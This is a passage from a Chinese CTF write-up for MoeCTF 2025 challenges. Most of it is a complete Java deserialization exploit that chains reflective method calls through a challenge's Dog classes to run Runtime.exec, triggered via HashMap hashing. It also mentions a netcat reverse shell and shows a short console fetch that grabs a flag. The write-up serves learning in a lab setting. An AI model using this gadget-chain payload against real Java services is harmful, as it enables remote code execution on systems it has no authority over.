class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">th2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">for</span> (Dog dog : (Collection) objectInputStream.readObject()) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="built_in">this</span>.nextId;</span><br><span class="line">                            <span class="built_in">this</span>.nextId = i + <span class="number">1</span>;</span><br><span class="line">                            dog.setId(i);</span><br><span class="line">                            <span class="built_in">this</span>.dogs.put(Integer.valueOf(dog.getId()), dog);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (objectInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="number">0</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    objectInputStream.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable th3) &#123;</span><br><span class="line">                                    th2.addSuppressed(th3);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                objectInputStream.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (byteArrayInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="number">0</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    byteArrayInputStream.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable th4) &#123;</span><br><span class="line">                                    th.addSuppressed(th4);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                byteArrayInputStream.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable th5) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (objectInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (th2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    objectInputStream.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Throwable th6) &#123;</span><br><span class="line">                                    th2.addSuppressed(th6);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                objectInputStream.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">throw</span> th5;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable th7) &#123;</span><br><span class="line">                    th2 = th7;</span><br><span class="line">                    <span class="keyword">throw</span> th7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的exportDogsBase64和importDogsBase64</p>
<p>exportDogsBase64是标准的数组序列化+base64编码操作，importDogsBase64是将base64编码解码并反序列化后遍历集合里的每一只狗对象然后放入dogs中</p>
<p>在里面有一个chainWagTail方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            input = dog.object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">        input = result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来像是一个任意方法调用的操作，跟进wagTail</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">wagTail</span><span class="params">(Object input, String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显这里是一个方法调用的函数，利用反射去获取并调用其原型类的方法</p>
<p>可以说wagTail相当于是InvokerTransformer#transform，而chainWagTail相当于是ChainedTransformer#transform</p>
<p>但是这里的属性需要反射去赋值</p>
<p>这样的话可以参考CC1中的构造</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>写出我们在这里的poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参考CC1</span></span><br><span class="line">        <span class="comment">//实例化Runtime对象并调用exec方法执行命令</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(Runtime.class),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span></span><br><span class="line"><span class="comment">//                &#125;;</span></span><br><span class="line">        <span class="comment">//定义多个dog对象进行链式调用</span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">2</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">3</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">4</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用链</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step1：获取Runtime原型类</span></span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;object&quot;</span>,runtime);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;forName&quot;</span>);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;java.lang.Runtime&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step2：获取getDeclaredMethod调用getRuntime实例化Runtime对象</span></span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;getDeclaredMethod&quot;</span>);</span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step3：获取invoke函数</span></span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;invoke&quot;</span>);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;runtime,<span class="literal">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step4：</span></span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;);</span><br></pre></td></tr></table></figure>

<p>然后需要放入dogs集合中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//放入dogService的dogs中</span></span><br><span class="line"><span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">setFieldValue(dogService,<span class="string">&quot;dogs&quot;</span>,dogs);</span><br></pre></td></tr></table></figure>

<p>接下来就是如何触发chainWagTail</p>
<p>在com&#x2F;example&#x2F;demo&#x2F;Dog&#x2F;Dog.java中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    wagTail(<span class="built_in">this</span>.object, <span class="built_in">this</span>.methodName, <span class="built_in">this</span>.paramTypes, <span class="built_in">this</span>.args);</span><br><span class="line">    <span class="keyword">return</span> Objects.hash(Integer.valueOf(<span class="built_in">this</span>.id));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以利用hashCode去触发一下chainWagTail，然后就是找哪里能调用hashCode方法，让我想到CC6中的HashMap#hash()去调用hashCode</p>
<p>关注到这里有一个put方法，并且put方法是能触发hashMap#hash的</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921172629618.png" alt="image-20250921172629618"></p>
<p>所以最后的POC是</p>
<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.Dog;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.DogService;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参考CC1</span></span><br><span class="line">        <span class="comment">//实例化Runtime对象并调用exec方法执行命令</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(Runtime.class),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span></span><br><span class="line"><span class="comment">//                &#125;;</span></span><br><span class="line">        <span class="comment">//定义多个dog对象进行链式调用</span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">2</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">3</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">4</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用链</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step1：获取Runtime原型类</span></span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;object&quot;</span>,runtime);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;forName&quot;</span>);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        setFieldValue(dog1,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;java.lang.Runtime&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step2：获取getDeclaredMethod调用getRuntime实例化Runtime对象</span></span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;getDeclaredMethod&quot;</span>);</span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">        setFieldValue(dog2,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step3：获取invoke函数</span></span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;invoke&quot;</span>);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;);</span><br><span class="line">        setFieldValue(dog3,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;runtime,<span class="literal">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//step4：</span></span><br><span class="line">        setFieldValue(dog4,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        setFieldValue(dog4,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        setFieldValue(dog4,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造Map类型的dogs对象集合</span></span><br><span class="line">        Map&lt;Integer, Dog&gt; dogs = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        dogs.put(<span class="number">1</span>,dog1);</span><br><span class="line">        dogs.put(<span class="number">2</span>,dog2);</span><br><span class="line">        dogs.put(<span class="number">3</span>,dog3);</span><br><span class="line">        dogs.put(<span class="number">4</span>,dog4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//放入dogService的dogs中</span></span><br><span class="line">        <span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">        setFieldValue(dogService,<span class="string">&quot;dogs&quot;</span>,dogs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用链触发dogService#chainWagTail()</span></span><br><span class="line">        Dog dog5=<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">5</span>,<span class="string">&quot;wanth3f1ag&quot;</span>,<span class="string">&quot;yellow&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(dog5,<span class="string">&quot;object&quot;</span>,dogService);</span><br><span class="line">        setFieldValue(dog5,<span class="string">&quot;methodName&quot;</span>,<span class="string">&quot;chainWagTail&quot;</span>);</span><br><span class="line">        setFieldValue(dog5,<span class="string">&quot;paramTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        setFieldValue(dog5,<span class="string">&quot;args&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//put触发hash-&gt;hashCode</span></span><br><span class="line">        Map&lt;Dog,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(dog5,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化POC</span></span><br><span class="line">        ByteOutputStream baos=<span class="keyword">new</span> <span class="title class_">ByteOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashmap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.encodeBase64(baos.toByteArray());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line"></span><br><span class="line">        ObjectInputStream bis= <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">        bis.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义一个修改属性值的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field_name, Object field_value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(field_name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, field_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921185531332.png" alt="image-20250921185531332"></p>
<p>题目给了堡垒机，我们ssh练上去</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921183738974.png" alt="image-20250921183738974"></p>
<p>然后用nc反弹shell</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921184601933.png" alt="image-20250921184601933"></p>
<h2 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a><strong>Moe笑传之猜猜爆</strong></h2><h3 id="前端JS-1"><a href="#前端JS-1" class="headerlink" title="#前端JS"></a>#前端JS</h3><p>一个猜数字的界面，只能猜一次，但是好像抓不到包？估计纯前端逻辑，看看js代码</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250925114232722.png" alt="image-20250925114232722"></p>
<p>这里发现猜对之后会对flag路径进行post请求，但是这里的话对请求没得验证逻辑，所以直接post请求路由就能拿到flag了</p>
<p>或者也可以在控制台中输出随机数的内容</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250925114413492.png" alt="image-20250925114413492"></p>
<p>也可以直接在控制台发送请求</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));</span><br></pre></td></tr></table></figure>

<h2 id="摸金偶遇FLAG，拼尽全力难战胜"><a href="#摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="摸金偶遇FLAG，拼尽全力难战胜"></a><strong>摸金偶遇FLAG，拼尽全力难战胜</strong></h2><h3 id="前端JS-2"><a href="#前端JS-2" class="headerlink" title="#前端JS"></a>#前端JS</h3><p>还是前端的东西，看一下script元素的内容</p>
<p>关注到getProgressBarText函数</p>
